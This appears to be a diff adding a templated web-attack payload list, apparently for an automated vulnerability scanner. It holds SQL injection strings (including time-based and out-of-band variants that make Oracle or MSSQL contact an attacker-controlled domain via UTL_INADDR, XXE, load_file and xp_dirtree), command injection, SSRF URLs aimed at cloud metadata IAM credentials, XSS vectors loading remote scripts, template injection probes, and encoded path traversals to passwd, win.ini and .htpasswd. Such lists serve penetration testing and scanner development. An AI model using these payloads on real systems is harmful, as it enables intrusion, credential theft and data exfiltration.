@@ -1,0 +1,251 @@
+'
+''
+\
+\\
+{base}-0
+{base}*1
+{base}'||'
+{base}'+'
+{base}' '
+"
+""
+{base}"||"
+{base}/*_*/
+'{base}'
+"{base}"
+({base})
+`
+{base}'--
+{base}')-- 
+{base}'))-- 
+{base}'#
+{base}')# 
+{base}'))# 
+{base}' and 'z'='z
+{base}' or 'z'='z
+{base}" or "z"="z
+}}
+${77*77}
+{{77*77}}
+xsstest'"><
+/{base}
+./{base}
+../{base}
+../../../../../../../../../../etc/passwd
+..\..\..\..\..\..\..\..\..\..\boot.ini
+{base}))))))))))
+{base}|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
+`id`
+{base};echo 111111
+http://[::ffff:169.254.169.254]
+http://[0:0:0:0:0:ffff:169.254.169.254]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+'
+''
+\
+\\
+\'
+{base}-0
+{base}*1
+{base}'||'
+{base}'+'
+{base}' '
+{base}'.'
+{base}','
+"
+""
+\"
+{base}"||"
+{base}"+"
+{base}","
+{base}/*_*/
+{base}/*x*/
+{base}|0
+'{base}'
+"{base}"
+({base})
+{base}'--
+{base}')--
+{base}');-- 
+{base}'))--
+{base}'));-- 
+{base}')))-- 
+{base}')));-- 
+{base}'#
+{base}')#
+{base}');#
+{base}'))#
+{base}'));# 
+{base}')))# 
+{base}"#
+{base}")#
+{base}");#
+' or 'z'='z
+1 or 7=7
+1 and 7=7
+{base} or 7=7
+{base} or 7=7-- 
+{base} or 7=7#
+{base} or 7=7)-- 
+{base} or 7=7)#
+{base}' or 7=7
+{base}' or 7=7-- 
+{base}' or 7=7#
+{base}' or 'z'='z
+{base}' or 'z'='z' or 'a'='b
+{base}'/**/or/**/'z'='z
+{base}' or username like '%
+{base}' or id like '%
+{base}' or user like '%
+{base}' or @version like '%
+{base}' or version() like '%
+{base}') or ('x'='x
+{base}')) or (('x'='x
+{base}' and 7=7
+{base}' and 7=7-- 
+{base}' and 7=7#
+{base}\' and 7=7--
+{base}\' and 7=7#
+" or "z"="z
+{base}" or 7=7
+{base}" or 7=7-- 
+{base}" or 7=7#
+{base}" or "z"="z
+{base}" or "z"="z" or "a"="b
+{base}"/**/or/**/"z"="z
+{base}" or username like "%
+{base}" or id like "%
+{base}" or user like "%
+{base}" or @version like "%
+{base}" or version() like "%
+{base}") or ("x"="x
+{base}")) or (("x"="x
+{base}" and 7=7
+{base}\" and 7=7--
+{base}\" and 7=7#
+(select 1)
+(select from dual)
+(select {base})
+`
+*/
+/*
+-->
+#>
+%27
+%22
+%5c
+À§
+Ä§
+ï¼
+À¢
+Ä¢
+ï¼
+&apos;
+Å
+ï¹¨
+ï¼¼
+{base}||UTL_INADDR.get_host_address('{domain}')
+{base}'||UTL_INADDR.get_host_address('{domain}')||'
+{base}||extractvalue(xmltype('<!DOCTYPE root [<!ENTITY % xxx SYSTEM {base}"http://{domain}/ext1">%xxx;]>'),'/l')
+{base}'||extractvalue(xmltype('<!DOCTYPE root [<!ENTITY % xxx SYSTEM {base}"http://{domain}/ext2">%xxx;]>'),'/l')||'
+UTL_INADDR.get_host_address(ORACLE_ENCODE_STRING({domain}))
+{base} or chr(1)=UTL_INADDR.get_host_address(ORACLE_ENCODE_STRING({domain}))
+extractvalue(xmltype(ORACLE_ENCODE_STRING(<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://{domain}/ext3">%xxx;]>),ORACLE_ENCODE_STRING(/l))
+{base} or chr(1)=extractvalue(xmltype(ORACLE_ENCODE_STRING(<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://{domain}/ext4">%xxx;]>),ORACLE_ENCODE_STRING(/l))
+(select load_file('\\\\{domain}\\c'))
+{base}'+(select load_file('\\\\{domain}\\e'))+'
+{base};EXEC master..xp_dirtree '\\{domain}\s'-- 
+1;EXEC master..xp_dirtree '\\{domain}\s'-- 
+{base}';EXEC master..xp_dirtree '\\{domain}\s'-- 
+{base}'EXEC master..xp_dirtree '\\{domain}\s'-- 
+{base}');EXEC master..xp_dirtree '\\{domain}\s'-- 
+{base};EXEC master..xp_dirtree "\\{domain}\s"-- 
+1;EXEC master..xp_dirtree "\\{domain}\s"-- 
+{base}";EXEC master..xp_dirtree "\\{domain}\s"-- 
+{base}");EXEC master..xp_dirtree "\\{domain}\s"-- 
+{base}"='';EXEC master..xp_dirtree "\\{domain}\s"-- 
+{base}"='');EXEC master..xp_dirtree "\\{domain}\s"-- 
+{base};DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+1;DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}');DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}";DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}");DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}"='';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}"='');DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}\';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}\";DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{domain}\s');EXEC(@x)--
+{base}' waitfor delay '0:0:20'--
+{base} waitfor delay '0:0:20'--
+',0)waitfor delay'0:0:20'--
+{base}'(select*from(select(sleep(20)))a)'
+{base}' (select*from(select(sleep(20)))a) '
+{base}' and (select*from(select(sleep(20)))a)-- 
+{base},(select*from(select(sleep(20)))a)
+@@version
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode<script>alert('xss')</script>
+//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'';!--"<XSS>=&{()}
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascrscriptipt:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+\";alert('XSS');//
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="width: expression(alert('XSS'));">
+{77*77}
+{{77*77}}
+{{{77*77}}}
+${77*77}
+${{77*77}}
+#{77*77}
+[[77*77]]
+{{=77*77}}
+/{base}
+./{base}
+../{base}
+/./{base}
+/../{base}
+xxx/../{base}
+{base}::$DATA
+../../../../../../../../../../../../etc/hosts
+..\..\..\..\..\..\..\..\..\..\..\..\windows/win.ini
+.htpasswd
+../.htpasswd
+../../.htpasswd
+../../../.htpasswd
+../../../../.htpasswd
+.%252e%252f.%252e%252f.%252e%252f.%252e%252f.%252e%252f.%252e%252f.%252e%252f.%252e%252f.%252e%252f.%252e%252f.%252e%252f.%252e%252fetc/hosts
+....//....//....//....//....//....//....//....//....//....//....//....//etc/hosts
+.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252fetc/hosts
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/hosts
+..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fetc/hosts
+..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/hosts
+..%c4%af..%c4%af..%c4%af..%c4%af..%c4%af..%c4%af..%c4%af..%c4%af..%c4%af..%c4%af..%c4%af..%c4%afetc/hosts
+..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/hosts
+.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/hosts
+.%c0%2e/.%c0%2e/.%c0%2e/.%c0%2e/.%c0%2e/.%c0%2e/.%c0%2e/.%c0%2e/.%c0%2e/.%c0%2e/.%c0%2e/.%c0%2e/etc/hosts
+.%c0%ae/.%c0%ae/.%c0%ae/.%c0%ae/.%c0%ae/.%c0%ae/.%c0%ae/.%c0%ae/.%c0%ae/.%c0%ae/.%c0%ae/.%c0%ae/etc/hosts
+.%c4%ae/.%c4%ae/.%c4%ae/.%c4%ae/.%c4%ae/.%c4%ae/.%c4%ae/.%c4%ae/.%c4%ae/.%c4%ae/.%c4%ae/.%c4%ae/etc/hosts
+.%e2%80%a4/.%e2%80%a4/.%e2%80%a4/.%e2%80%a4/.%e2%80%a4/.%e2%80%a4/.%e2%80%a4/.%e2%80%a4/.%e2%80%a4/.%e2%80%a4/.%e2%80%a4/.%e2%80%a4/etc/hosts
+%e2%80%a5/%e2%80%a5/%e2%80%a5/%e2%80%a5/%e2%80%a5/%e2%80%a5/%e2%80%a5/%e2%80%a5/%e2%80%a5/%e2%80%a5/%e2%80%a5/%e2%80%a5/etc/hosts
+.\u002e/.\u002e/.\u002e/.\u002e/.\u002e/.\u002e/.\u002e/.\u002e/.\u002e/.\u002e/.\u002e/.\u002e/etc/hosts
+.%252e%252f.%252e%252f.%252e%252f.%252e%252f.%252e%252f.%252e%252f.%252e%252f.%252e%252f.%252e%252f.%252e%252f.%252e%252f.%252e%252fwindows/win.ini
+....//....//....//....//....//....//....//....//....//....//....//....//windows/win.ini
+.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252f.%252e.%252e/%252fwindows/win.ini
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
+..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2fwindows/win.ini
+..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
